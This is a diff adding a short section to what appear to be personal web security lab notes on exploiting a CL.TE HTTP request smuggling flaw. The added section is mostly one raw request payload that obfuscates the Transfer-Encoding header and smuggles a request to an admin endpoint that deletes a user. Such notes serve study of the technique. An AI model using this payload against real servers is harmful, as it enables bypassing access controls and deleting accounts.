@@ -43,3 +43,23 @@ x=1
 
 ![[Pasted image 20240815060930.png]]
 
+# Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
+
+![[Pasted image 20240815063631.png]]
+
+```
+tRANSFER-ENCODING: chunked
+Connection: close
+
+3
+x=y
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+X-Ignore: X
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 45
+Host: localhost
+
+x=
+```
